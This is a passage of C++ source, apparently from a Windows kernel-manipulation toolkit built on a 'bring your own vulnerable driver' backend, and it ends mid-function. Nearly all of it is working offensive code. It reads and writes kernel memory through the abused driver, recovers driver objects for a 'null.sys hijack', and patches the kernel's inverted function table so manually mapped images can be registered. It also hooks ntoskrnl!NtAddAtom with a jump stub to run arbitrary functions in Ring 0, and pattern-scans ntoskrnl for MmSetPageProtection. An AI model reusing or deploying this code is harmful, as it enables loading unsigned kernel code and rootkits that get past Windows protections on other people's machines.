#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <psapi.h>
#include <vector>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <iostream>
#include <mutex>
#include <cstdlib>
#include <cstdio>

// MinGW does not expose these in winternl.h by default.
#ifndef SystemModuleInformation
#define SystemModuleInformation 11
#endif

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib") // CMake links ntdll for other toolchains
#endif

namespace hinv {
namespace kmem {

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

// ---------------------------------------------------------------------------
// Module name normalization
// ---------------------------------------------------------------------------

std::wstring NormalizeModuleName(const std::string& moduleName) {
    std::wstring s(moduleName.begin(), moduleName.end());
    return NormalizeModuleName(s);
}

std::wstring NormalizeModuleName(const std::wstring& moduleName) {
    std::wstring s = ToLower(moduleName);

    // Strip path.
    size_t slash = s.find_last_of(L"\\/");
    if (slash != std::wstring::npos) s = s.substr(slash + 1);

    // Strip extension for matching, then map known aliases.
    size_t dot = s.find(L'.');
    std::wstring stem = (dot != std::wstring::npos) ? s.substr(0, dot) : s;

    if (stem == L"ntoskrnl" || stem == L"ntkrnlpa" || stem == L"ntkrnlmp") return L"ntoskrnl.exe";
    if (stem == L"hal") return L"hal.dll";
    if (stem == L"fltmgr") return L"fltmgr.sys";
    if (stem == L"kdcom") return L"kdcom.dll";
    if (stem == L"ndis") return L"ndis.sys";
    if (stem == L"tcpip") return L"tcpip.sys";
    if (stem == L"win32k") return L"win32k.sys";
    if (stem == L"ci") return L"ci.dll";
    if (stem == L"clfs") return L"clfs.sys";

    // Default: assume .sys for kernel modules without extension.
    if (dot == std::wstring::npos) return stem + L".sys";
    return s;
}

// ---------------------------------------------------------------------------
// Module enumeration
// ---------------------------------------------------------------------------

using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ---------------------------------------------------------------------------
// Real DRIVER_OBJECT recovery (null.sys hijack support)
// ---------------------------------------------------------------------------

namespace {

constexpr ULONG SystemExtendedHandleInformationClass = 64;
constexpr NTSTATUS StatusInfoLengthMismatch = static_cast<NTSTATUS>(0xC0000004L);

struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
};

struct SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};

} // namespace

uint64_t GetDriverObjectFromHandle(byovd::IByovdBackend* backend, HANDLE deviceHandle) {
    if (!backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) return 0;

    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
    if (!NtQuerySystemInformation) return 0;

    // On this build a NULL buffer returns only the header; the real size
    // arrives via ReturnLength of a small fill attempt. Grow one in/out
    // variable until SUCCESS (kdmapper pattern).
    ULONG size = 1u << 20;
    std::vector<uint8_t> buf;
    NTSTATUS st = StatusInfoLengthMismatch;
    for (int tries = 0; tries < 16 && st == StatusInfoLengthMismatch; ++tries) {
        buf.resize(size);
        ULONG retLen = 0;
        st = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformationClass),
                                      buf.data(), size, &retLen);
        if (st == StatusInfoLengthMismatch)
            size = (retLen > size) ? retLen + 0x10000 : size * 2;
    }
    if (!NT_SUCCESS(st)) return 0;

    auto* info = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buf.data());
    const ULONG_PTR maxHandles =
        (buf.size() >= offsetof(SYSTEM_HANDLE_INFORMATION_EX, Handles))
            ? (buf.size() - offsetof(SYSTEM_HANDLE_INFORMATION_EX, Handles)) / sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)
            : 0;
    if (info->NumberOfHandles > maxHandles) return 0;

    const ULONG_PTR selfPid = GetCurrentProcessId();
    const ULONG_PTR targetHandle = reinterpret_cast<ULONG_PTR>(deviceHandle);
    uint64_t fileObject = 0;
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
        const auto& e = info->Handles[i];
        if (e.UniqueProcessId == selfPid && e.HandleValue == targetHandle) {
            fileObject = reinterpret_cast<uint64_t>(e.Object);
            break;
        }
    }
    if (!fileObject) return 0;

    // x64: FILE_OBJECT.DeviceObject @ 0x8, DEVICE_OBJECT.DriverObject @ 0x8.
    uint64_t deviceObject = 0;
    uint64_t driverObject = 0;
    if (!ReadU64(backend, fileObject + 0x8, deviceObject) || !deviceObject) return 0;
    if (!ReadU64(backend, deviceObject + 0x8, driverObject) || !driverObject) return 0;
    return driverObject;
}

std::vector<KernelModule> EnumKernelModules() {
    std::vector<KernelModule> result;
    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
    if (!NtQuerySystemInformation) return result;

    ULONG size = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (size == 0) return result;

    std::vector<uint8_t> buffer(size);
    if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, buffer.data(), size, &size)))
        return result;

    auto* info = reinterpret_cast<RTL_PROCESS_MODULES*>(buffer.data());
    for (ULONG i = 0; i < info->NumberOfModules; ++i) {
        const auto& m = info->Modules[i];
        KernelModule km;
        km.base = reinterpret_cast<uint64_t>(m.ImageBase);
        km.size = m.ImageSize;
        std::string asciiName(reinterpret_cast<const char*>(m.FullPathName));
        km.name.assign(asciiName.begin(), asciiName.end());
        // Keep only the file name for display; base/size are what matter.
        size_t slash = km.name.find_last_of(L"\\/");
        if (slash != std::wstring::npos) km.name = km.name.substr(slash + 1);
        result.push_back(km);
    }
    return result;
}

// ---------------------------------------------------------------------------
// Kernel export resolution
// ---------------------------------------------------------------------------

uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName, unsigned depth) {
    if (!backend || !moduleBase || !exportName || depth > 4) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    // e_lfanew is signed LONG; reject negative/out-of-range before adding.
    int64_t ntOff = static_cast<int64_t>(dos.e_lfanew);
    if (ntOff < static_cast<int64_t>(sizeof(IMAGE_DOS_HEADER)) ||
        ntOff > static_cast<int64_t>(0x100000)) return 0; // NT header never lives past 1 MB

    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + ntOff, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;
    if (nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 0;

    const uint64_t imageSize = nt.OptionalHeader.SizeOfImage;
    if (imageSize == 0 || imageSize > 0x20000000) return 0;

    const auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) return 0;
    // The export directory itself must fit the image (64-bit arithmetic).
    if (static_cast<uint64_t>(exportDir.VirtualAddress) + exportDir.Size > imageSize) return 0;
    if (static_cast<uint64_t>(exportDir.VirtualAddress) + sizeof(IMAGE_EXPORT_DIRECTORY) > imageSize) return 0;

    IMAGE_EXPORT_DIRECTORY expDir{};
    if (!backend->ReadKernelMemory(moduleBase + exportDir.VirtualAddress, &expDir, sizeof(expDir))) return 0;

    // Cap the counts BEFORE allocating: a corrupt NumberOfNames would otherwise
    // turn into a gigantic usermode allocation and a wild multi-MB backend read.
    constexpr uint32_t MAX_EXPORTS = 0x100000;
    if (expDir.NumberOfNames > MAX_EXPORTS || expDir.NumberOfFunctions > MAX_EXPORTS) return 0;
    if (expDir.NumberOfNames == 0 || expDir.NumberOfFunctions == 0) return 0;

    // All three arrays must live inside the image (64-bit, overflow-free).
    if (static_cast<uint64_t>(expDir.AddressOfNames) + static_cast<uint64_t>(expDir.NumberOfNames) * 4 > imageSize)
        return 0;
    if (static_cast<uint64_t>(expDir.AddressOfNameOrdinals) + static_cast<uint64_t>(expDir.NumberOfNames) * 2 > imageSize)
        return 0;
    if (static_cast<uint64_t>(expDir.AddressOfFunctions) + static_cast<uint64_t>(expDir.NumberOfFunctions) * 4 > imageSize)
        return 0;

    std::vector<uint32_t> rvas(expDir.NumberOfNames);
    std::vector<uint16_t> ords(expDir.NumberOfNames);
    std::vector<uint32_t> funcs(expDir.NumberOfFunctions);

    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNames, rvas.data(), rvas.size() * sizeof(uint32_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNameOrdinals, ords.data(), ords.size() * sizeof(uint16_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfFunctions, funcs.data(), funcs.size() * sizeof(uint32_t)))
        return 0;

    const uint64_t exportDirEnd = static_cast<uint64_t>(exportDir.VirtualAddress) + exportDir.Size;

    for (uint32_t i = 0; i < expDir.NumberOfNames; ++i) {
        // Names table entry must point inside the image.
        if (!rvas[i] || rvas[i] >= imageSize) continue;
        // Read only up to the image end and require a NUL inside that window.
        size_t maxLen = static_cast<size_t>(imageSize - rvas[i]);
        if (maxLen > 255) maxLen = 255;
        char name[256]{};
        if (!backend->ReadKernelMemory(moduleBase + rvas[i], name, maxLen)) continue;
        name[maxLen] = '\0';
        size_t nameLen = strnlen(name, maxLen);
        if (nameLen == maxLen) continue; // not NUL-terminated within the image
        if (std::strcmp(name, exportName) == 0) {
            uint16_t ord = ords[i];
            if (ord >= expDir.NumberOfFunctions) return 0;
            uint32_t funcRva = funcs[ord];
            // The RVA must land inside the image; anything else is a corrupt
            // table or a hostile image, never a valid export.
            if (!funcRva || funcRva >= imageSize) return 0;
            // Forwarded export: the RVA points back INTO the export directory
            // and holds an "OtherDll.Export" string instead of code. Chase it
            // through the named module (depth-capped against forward loops).
            if (static_cast<uint64_t>(funcRva) >= exportDir.VirtualAddress &&
                static_cast<uint64_t>(funcRva) < exportDirEnd) {
                // The forwarder string must end inside the image.
                size_t fwdMax = static_cast<size_t>(imageSize - funcRva);
                if (fwdMax > 127) fwdMax = 127;
                char fwd[128]{};
                if (!backend->ReadKernelMemory(moduleBase + funcRva, fwd, fwdMax)) return 0;
                fwd[fwdMax] = '\0';
                size_t fwdLen = strnlen(fwd, fwdMax);
                if (fwdLen == fwdMax) return 0; // no NUL within bounds
                std::string fwdStr(fwd, fwdLen);
                size_t dot = fwdStr.find('.');
                if (dot == std::string::npos || dot + 1 >= fwdStr.size()) return 0;
                if (fwdStr[dot + 1] == '#') return 0; // ordinal forwarder: unsupported
                // The forwarder DLL name has no extension ("ntoskrnl" for
                // ntoskrnl.exe, "hal" for hal.dll, "foo" for foo.dll). Try the
                // known aliases via NormalizeModuleName, then the plausible
                // extensions, first hit wins.
                std::string dllName = fwdStr.substr(0, dot);
                std::string fnName = fwdStr.substr(dot + 1);
                std::wstring dllW(dllName.begin(), dllName.end());
                std::wstring aliases[4] = { NormalizeModuleName(dllName),
                                            dllW + L".dll", dllW + L".exe", dllW + L".sys" };
                for (const auto& cand : aliases) {
                    uint64_t addr = ResolveKernelExport(backend, cand.c_str(), fnName.c_str(), depth + 1);
                    if (addr) return addr;
                }
                return 0;
            }
            return moduleBase + funcRva;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Process-local registry of manually mapped modules
// ---------------------------------------------------------------------------

static std::mutex g_mappedModulesMutex;
static std::vector<MappedModule> g_mappedModules;

void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_t size) {
    if (moduleName.empty() || !base || !size) return;

    std::wstring name = ToLower(moduleName);
    size_t slash = name.find_last_of(L"\\/");
    if (slash != std::wstring::npos) name = name.substr(slash + 1);

    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (auto& m : g_mappedModules) {
        if (m.name == name) {
            m.base = base;
            m.size = size;
            return;
        }
    }
    g_mappedModules.push_back({ name, base, size });
}

// Returns the base of a registered mapped module, or 0. lowerName must
// already be lowercase file stem + extension (e.g. L"hyperhv.dll").
static uint64_t FindMappedModule(const std::wstring& lowerName) {
    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (const auto& m : g_mappedModules) {
        if (m.name == lowerName) return m.base;
    }
    return 0;
}

uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName,
                             unsigned depth) {
    if (depth > 4) return 0;
    std::wstring target = ToLower(moduleName);

    // Manually mapped modules never appear in PsLoadedModuleList; check the
    // process-local registry first. GetKernelExport parses the export table
    // from kernel memory through the backend, which works because the mapped
    // image retains its PE headers.
    uint64_t mappedBase = FindMappedModule(target);
    if (mappedBase) return GetKernelExport(backend, mappedBase, exportName, depth);

    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name) == target) {
            return GetKernelExport(backend, m.base, exportName, depth);
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Inverted function table (24H2 replacement for RtlAddFunctionTable)
// ---------------------------------------------------------------------------

namespace detail {

// Field offsets inside PsInvertedFunctionTable (see hinv_kmem.hpp).
constexpr uint32_t IFT_CURSIZE   = 0x00;
constexpr uint32_t IFT_MAXSIZE   = 0x04;
constexpr uint32_t IFT_EPOCH     = 0x08;
constexpr uint32_t IFT_OVERFLOW  = 0x0C;
constexpr uint32_t IFT_ENTRIES   = 0x10;
constexpr uint32_t IFT_STRIDE    = 0x18;
constexpr uint32_t IFT_ENT_BASE  = 0x08; // ImageBase inside an entry

// Read and sanity-check the table header. Garbage here means the extracted
// address was wrong — never write through an unvalidated pointer.
static bool ReadIftHeader(byovd::IByovdBackend* backend, uint64_t tableVa,
                          uint32_t& cur, uint32_t& max, uint8_t& overflow) {
    if (!ReadU32(backend, tableVa + IFT_CURSIZE, cur) ||
        !ReadU32(backend, tableVa + IFT_MAXSIZE, max)) return false;
    if (!backend->ReadKernelMemory(tableVa + IFT_OVERFLOW, &overflow, 1)) return false;
    if (max == 0 || max > 0x1000 || cur > max) return false;
    if (overflow != 0 && overflow != 1) return false;
    return true;
}

uint64_t FindInvertedFunctionTable(byovd::IByovdBackend* backend, uint64_t lookupFnVa) {
    if (!backend || !lookupFnVa) return 0;
    uint8_t bytes[0x40]{};
    if (!backend->ReadKernelMemory(lookupFnVa, bytes, sizeof(bytes))) return 0;

    // mov rcx, [rip+disp32] (48 8B 0D) loads PsInvertedFunctionTable+0x18 right
    // after the prologue. Try every candidate; the header check disambiguates.
    for (size_t i = 0; i + 7 <= sizeof(bytes); ++i) {
        if (bytes[i] != 0x48 || bytes[i + 1] != 0x8B || bytes[i + 2] != 0x0D) continue;
        int32_t disp = 0;
        std::memcpy(&disp, bytes + i + 3, sizeof(disp));
        uint64_t fieldVa = lookupFnVa + i + 7 + static_cast<int64_t>(disp);
        if ((fieldVa >> 48) != 0xFFFF || (fieldVa & 7) != 0) continue;
        uint64_t tableVa = fieldVa - 0x18;
        uint32_t cur = 0, max = 0;
        uint8_t overflow = 0;
        if (ReadIftHeader(backend, tableVa, cur, max, overflow)) return tableVa;
    }
    return 0;
}

bool InsertInvertedFunctionTableEntryAt(byovd::IByovdBackend* backend, uint64_t tableVa,
                                        uint64_t functionTableVa, uint64_t imageBase,
                                        uint32_t imageSize, uint32_t tableSize) {
    uint32_t cur = 0, max = 0, epoch = 0;
    uint8_t overflow = 0;
    if (!ReadIftHeader(backend, tableVa, cur, max, overflow)) return false;
    // Overflow means the kernel already gave up on the table once; inserts are
    // no longer consulted the same way. Fail closed instead of writing anyway.
    if (overflow != 0 || cur >= max) return false;
    if (!ReadU32(backend, tableVa + IFT_EPOCH, epoch)) return false;

    // Entries [1, cur) are sorted ascending by ImageBase; entry [0] is the
    // kernel's MRU/hot slot (ntoskrnl in practice) and must NOT be shifted —
    // insert before the first greater entry among [1, cur), never at [0].
    // Same base => already registered, treat as success.
    uint32_t pos = cur;
    for (uint32_t i = (cur > 0 ? 1 : 0); i < cur; ++i) {
        uint64_t entryBase = 0;
        if (!ReadU64(backend, tableVa + IFT_ENTRIES + i * IFT_STRIDE + IFT_ENT_BASE, entryBase)) return false;
        if (entryBase == imageBase) return true;
        if (entryBase > imageBase && pos == cur) pos = i;
    }

    // Odd epoch signals "mutation in progress" to lock-free readers, matching
    // the kernel's lock-inc-before / lock-inc-after pattern.
    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 1)) return false;

    // Shift [pos, cur) up one slot, back to front.
    for (uint32_t i = cur; i > pos; --i) {
        uint8_t entry[IFT_STRIDE]{};
        uint64_t src = tableVa + IFT_ENTRIES + (i - 1) * IFT_STRIDE;
        if (!backend->ReadKernelMemory(src, entry, IFT_STRIDE)) return false;
        if (!backend->WriteKernelMemory(src + IFT_STRIDE, entry, IFT_STRIDE)) return false;
    }

    uint64_t slot = tableVa + IFT_ENTRIES + pos * IFT_STRIDE;
    if (!WriteU64(backend, slot + 0x00, functionTableVa)) return false;
    if (!WriteU64(backend, slot + 0x08, imageBase)) return false;
    if (!WriteU32(backend, slot + 0x10, imageSize)) return false;
    if (!WriteU32(backend, slot + 0x14, tableSize)) return false;

    if (!WriteU32(backend, tableVa + IFT_CURSIZE, cur + 1)) return false;
    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 2)) return false;

    // Read-back: a torn or misdirected write here corrupts every future
    // exception dispatch — confirm the slot landed before declaring success.
    uint64_t rbFt = 0, rbBase = 0;
    uint32_t rbImg = 0, rbTbl = 0;
    if (!ReadU64(backend, slot + 0x00, rbFt) || !ReadU64(backend, slot + 0x08, rbBase) ||
        !ReadU32(backend, slot + 0x10, rbImg) || !ReadU32(backend, slot + 0x14, rbTbl)) return false;
    return rbFt == functionTableVa && rbBase == imageBase && rbImg == imageSize && rbTbl == tableSize;
}

bool RemoveInvertedFunctionTableEntryAt(byovd::IByovdBackend* backend, uint64_t tableVa,
                                        uint64_t imageBase) {
    uint32_t cur = 0, max = 0, epoch = 0;
    uint8_t overflow = 0;
    if (!ReadIftHeader(backend, tableVa, cur, max, overflow)) return false;
    if (!ReadU32(backend, tableVa + IFT_EPOCH, epoch)) return false;

    uint32_t pos = cur;
    for (uint32_t i = 0; i < cur; ++i) {
        uint64_t entryBase = 0;
        if (!ReadU64(backend, tableVa + IFT_ENTRIES + i * IFT_STRIDE + IFT_ENT_BASE, entryBase)) return false;
        if (entryBase == imageBase) { pos = i; break; }
    }
    if (pos == cur) return true; // nothing to remove

    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 1)) return false;

    for (uint32_t i = pos; i + 1 < cur; ++i) {
        uint8_t entry[IFT_STRIDE]{};
        uint64_t src = tableVa + IFT_ENTRIES + (i + 1) * IFT_STRIDE;
        if (!backend->ReadKernelMemory(src, entry, IFT_STRIDE)) return false;
        if (!backend->WriteKernelMemory(src - IFT_STRIDE, entry, IFT_STRIDE)) return false;
    }

    if (!WriteU32(backend, tableVa + IFT_CURSIZE, cur - 1)) return false;
    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 2)) return false;
    return true;
}

} // namespace detail

uint64_t ResolveInvertedFunctionTable(byovd::IByovdBackend* backend) {
    static std::mutex s_mutex;
    static uint64_t s_table = 0;
    std::lock_guard<std::mutex> lock(s_mutex);
    if (s_table) return s_table;

    uint64_t lookupFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlLookupFunctionEntry");
    if (!lookupFn) return 0;
    s_table = detail::FindInvertedFunctionTable(backend, lookupFn);
    return s_table;
}

bool InsertInvertedFunctionTableEntry(byovd::IByovdBackend* backend, uint64_t functionTableVa,
                                      uint64_t imageBase, uint32_t imageSize, uint32_t tableSize) {
    uint64_t table = ResolveInvertedFunctionTable(backend);
    if (!table) return false;
    return detail::InsertInvertedFunctionTableEntryAt(backend, table, functionTableVa,
                                                      imageBase, imageSize, tableSize);
}

bool RemoveInvertedFunctionTableEntry(byovd::IByovdBackend* backend, uint64_t imageBase) {
    uint64_t table = ResolveInvertedFunctionTable(backend);
    if (!table) return false;
    return detail::RemoveInvertedFunctionTableEntryAt(backend, table, imageBase);
}

// ---------------------------------------------------------------------------
// OS version detection
// ---------------------------------------------------------------------------

OsVersionInfo GetOsVersion() {
    OsVersionInfo info{};
    using RtlGetVersionFn = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW);
    auto RtlGetVersion = reinterpret_cast<RtlGetVersionFn>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion")));
    if (RtlGetVersion) {
        RTL_OSVERSIONINFOW os{};
        os.dwOSVersionInfoSize = sizeof(os);
        if (NT_SUCCESS(RtlGetVersion(&os))) {
            info.major = os.dwMajorVersion;
            info.minor = os.dwMinorVersion;
            info.build = os.dwBuildNumber;
            info.revision = os.dwPlatformId; // not revision; kept for compatibility
        }
    }
    return info;
}

// ---------------------------------------------------------------------------
// Arbitrary kernel function calls (kdmapper-style NtAddAtom hook)
// ---------------------------------------------------------------------------
//
// Replaces the old HalDispatchTable shellcode machinery (which needed the
// randomized PTE self-reference index and bugchecked this machine three
// times). Instead, we overwrite the first bytes of ntoskrnl!NtAddAtom with
// `mov rax, target; jmp rax` through the backend's read-only write primitive
// (physical mapping on the Intel backend), then invoke ntdll!NtAddAtom from
// usermode: the syscall lands in our hook with the original argument
// registers, so the target runs in Ring 0 with our args and its return value
// comes back in RAX. The prologue is always restored.

void Trace(const char* stage) {
    static const std::string path = [] {
        const char* p = std::getenv("HINV_TRACE");
        return p ? std::string(p) : std::string();
    }();
    if (path.empty()) return;
    // Write-through is the whole point: FILE_FLAG_WRITE_THROUGH commits data
    // and metadata to disk before WriteFile returns, so lines already written
    // survive an immediate bugcheck (buffered stdio loses them).
    HANDLE h = CreateFileA(path.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_ALWAYS, FILE_FLAG_WRITE_THROUGH, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    char line[256];
    int n = snprintf(line, sizeof(line), "%s\n", stage);
    // snprintf returns what WOULD have been written; clamp or a long stage
    // reads past the buffer into the trace file.
    if (n > 0) {
        if (n >= static_cast<int>(sizeof(line))) n = static_cast<int>(sizeof(line)) - 1;
        DWORD written = 0;
        WriteFile(h, line, static_cast<DWORD>(n), &written, nullptr);
    }
    CloseHandle(h);
}

namespace detail {

static uint64_t KernelNtAddAtom(byovd::IByovdBackend* backend) {
    static uint64_t cached = 0;
    if (!cached) cached = ResolveKernelExport(backend, L"ntoskrnl.exe", "NtAddAtom");
    return cached;
}

void* UserNtAddAtom() {
    return reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAddAtom"));
}

bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]) {
    Trace("kmem: hook install begin");
    uint64_t ntAddAtom = KernelNtAddAtom(backend);
    if (!ntAddAtom || !UserNtAddAtom()) { Trace("kmem: hook install failed (resolve)"); return false; }

    if (!backend->ReadKernelMemory(ntAddAtom, original, 12)) { Trace("kmem: hook install failed (read)"); return false; }

    uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
    std::memcpy(stub + 2, &target, 8);
    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, stub, sizeof(stub));
    Trace(ok ? "kmem: hook installed" : "kmem: hook install failed (write)");
    return ok;
}

bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]) {
    Trace("kmem: hook remove begin");
    uint64_t ntAddAtom = KernelNtAddAtom(backend);
    if (!ntAddAtom) return false;
    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, original, 12);
    Trace(ok ? "kmem: hook removed" : "kmem: hook remove failed");
    return ok;
}

} // namespace detail

// ---------------------------------------------------------------------------
// Kernel pattern scanning (in-image reads only — always safe through the
// backend because every byte of a loaded module's image is resident/mapped)
// ---------------------------------------------------------------------------

static uint64_t FindPatternInSectionKernel(byovd::IByovdBackend* backend, uint64_t moduleBase,
                                           const char* sectionName,
                                           const std::vector<uint8_t>& pattern,
                                           const std::vector<bool>& mask) {
    if (!backend || pattern.empty() || pattern.size() != mask.size()) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = moduleBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    uint64_t secVa = 0;
    uint32_t secSize = 0;
    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            secVa = moduleBase + sec.VirtualAddress;
            secSize = sec.Misc.VirtualSize;
            break;
        }
    }
    if (!secVa || !secSize) return 0;

    constexpr size_t CHUNK = 0x1000;
    std::vector<uint8_t> buffer(CHUNK + pattern.size());
    for (uint32_t off = 0; off < secSize; off += CHUNK) {
        uint32_t readSize = (off + CHUNK > secSize) ? (secSize - off) : CHUNK;
        readSize = static_cast<uint32_t>(readSize + pattern.size());
        if (off + readSize > secSize) readSize = secSize - off;
        if (!backend->ReadKernelMemory(secVa + off, buffer.data(), readSize)) continue;

        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
            bool match = true;
            for (size_t j = 0; j < pattern.size(); ++j) {
                if (mask[j] && buffer[i + j] != pattern[j]) { match = false; break; }
            }
            if (match) return secVa + off + i;
        }
    }
    return 0;
}

static uint64_t GetNtoskrnlBase() {
    for (const auto& m : EnumKernelModules()) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) return m.base;
    }
    return 0;
}

// MmSetPageProtection is documented since 1803 but not always exported. When
// the export is missing, recover it with kdmapper's PAGELK pattern: a
// `cmovcc + lea + call` sequence whose final E8 calls MmSetPageProtection.
static uint64_t ResolveMmSetPageProtection(byovd::IByovdBackend* backend) {
    static uint64_t cached = 0;
    if (cached) return cached;

    uint64_t addr = ResolveKernelExport(backend, L"ntoskrnl.exe", "MmSetPageProtection");
    if (addr) { cached = addr; return addr; }

    uint64_t ntosBase = GetNtoskrnlBase();
    if (!ntosBase) return 0;

    IMAGE_NT_HEADERS64 nt{};
    {
        IMAGE_DOS_HEADER dos{};
        if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return 0;
        if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    }
    uint64_t imageEnd = ntosBase + nt.OptionalHeader.SizeOfImage;

    // Pattern 1: 0F 45 ?? ?? 8D ?? ?? ?? FF FF E8 — E8 sits at match+10.
    {
        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
        std::vector<bool>   msk = { true, true, false, false, true, false, false, false, true, true, true };
        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
        if (m) {
            int32_t rel = 0;
            if (ReadU32(backend, m + 11, reinterpret_cast<uint32_t&>(rel))) {
                uint64_t target = m + 10 + 5 + rel;
                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
            }
        }
    }

    // Pattern 2 (some builds keep an extra mov in the middle):
    // 0F 45 ?? ?? 45 8B ?? ?? ?? ?? 8D ?? ?? ?? ?? ?? ?? FF FF E8 — E8 at match+19.
    {
        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x45, 0x8B, 0x00, 0x00, 0x00, 0x00,
                                     0x8D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
        std::vector<bool>   msk = { true, true, false, false, true, true, false, false, false, false,
                                    true, false, false, false, false, false, false, true, true, true };
        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
        if (m) {
            int32_t rel = 0;
            if (ReadU32(backend, m + 20, reinterpret_cast<uint32_t&>(rel))) {
                uint64_t target = m + 19 + 5 + rel;
